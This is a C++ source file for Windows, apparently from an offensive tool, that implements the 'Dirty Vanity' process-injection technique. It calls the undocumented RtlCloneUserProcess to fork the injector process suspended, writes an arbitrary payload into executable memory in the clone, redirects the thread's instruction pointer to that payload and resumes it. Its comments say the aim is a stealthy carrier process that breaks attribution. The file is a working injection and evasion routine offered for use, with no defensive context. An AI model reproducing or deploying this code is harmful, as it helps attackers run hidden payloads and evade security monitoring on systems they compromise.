#include "stdafx.h"
#include "dirty_vanity.h"
#include "logger.h"
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

// Undocumented structures for RtlCloneUserProcess
#define RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED 0x00000001
#define RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES 0x00000002
#define RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE 0x00000004

typedef struct _RTL_USER_PROCESS_INFORMATION {
    ULONG Length;
    HANDLE ProcessHandle;
    HANDLE ThreadHandle;
    ULONG ClientId[2];
    PVOID ImageInformation;
} RTL_USER_PROCESS_INFORMATION, *PRTL_USER_PROCESS_INFORMATION;

extern "C" NTSTATUS NTAPI RtlCloneUserProcess(
    ULONG ProcessFlags,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE DebugPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

namespace DirtyVanity {

// To implement Dirty Vanity across arbitrary processes, we typically 
// duplicate handles and trigger an API call, but due to access limits,
// the classic approach is to have the TARGET process call RtlCloneUserProcess
// on itself via ROP/APC, or for the injector to clone ITSELF and inject.
//
// Here, we clone our current injector process to spawn a stealthy detached
// child process that runs the payload, breaking attribution.

HANDLE ForkAndInject(HANDLE /*hSourceProcess - Unused in this variant*/, const void* pPayload, size_t payloadSize) {
    RTL_USER_PROCESS_INFORMATION cloneInfo = { 0 };
    cloneInfo.Length = sizeof(RTL_USER_PROCESS_INFORMATION);

    // 1. Clone the current process, suspended
    NTSTATUS status = RtlCloneUserProcess(
        RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED | RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES,
        nullptr, nullptr, nullptr, &cloneInfo
    );

    // RtlCloneUserProcess returns STATUS_PROCESS_CLONED (0x297) in the child,
    // and STATUS_SUCCESS (0x0) in the parent.
    if (status == 0x297) {
        // We are the child process. We shouldn't hit this path dynamically here 
        // since we suspend, but if we did, we'd exit immediately.
        ExitProcess(0);
        return nullptr;
    }

    if (!NT_SUCCESS(status) || !cloneInfo.ProcessHandle || !cloneInfo.ThreadHandle) {
        LOG(L"DirtyVanity: Failed to clone process. Status: 0x%08X", status);
        return nullptr;
    }

    // 2. We are the parent. Allocate and write the payload into the child.
    PVOID pRemotePayload = VirtualAllocEx(
        cloneInfo.ProcessHandle, nullptr, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!pRemotePayload) {
        TerminateProcess(cloneInfo.ProcessHandle, 0);
        CloseHandle(cloneInfo.ProcessHandle);
        CloseHandle(cloneInfo.ThreadHandle);
        return nullptr;
    }

    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(cloneInfo.ProcessHandle, pRemotePayload, pPayload, payloadSize, &bytesWritten)) {
        TerminateProcess(cloneInfo.ProcessHandle, 0);
        CloseHandle(cloneInfo.ProcessHandle);
        CloseHandle(cloneInfo.ThreadHandle);
        return nullptr;
    }

    // 3. Hijack the suspended thread's execution context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_CONTROL;
    if (!GetThreadContext(cloneInfo.ThreadHandle, &ctx)) {
        TerminateProcess(cloneInfo.ProcessHandle, 0);
        return nullptr;
    }

#ifdef _M_AMD64
    ctx.Rip = (DWORD64)pRemotePayload;
#elif defined(_M_IX86)
    ctx.Eip = (DWORD)pRemotePayload;
#elif defined(_M_ARM64)
    ctx.Pc = (DWORD64)pRemotePayload;
#else
#error Unsupported architecture
#endif

    if (!SetThreadContext(cloneInfo.ThreadHandle, &ctx)) {
        TerminateProcess(cloneInfo.ProcessHandle, 0);
        return nullptr;
    }

    // 4. Resume the thread. The cloned process now acts as a stealthy carrier.
    ResumeThread(cloneInfo.ThreadHandle);
    
    VERBOSE(L"DirtyVanity: Successfully cloned process (PID %u) and injected payload at %p",
            GetProcessId(cloneInfo.ProcessHandle), pRemotePayload);

    CloseHandle(cloneInfo.ThreadHandle);
    return cloneInfo.ProcessHandle;
}

} // namespace DirtyVanity
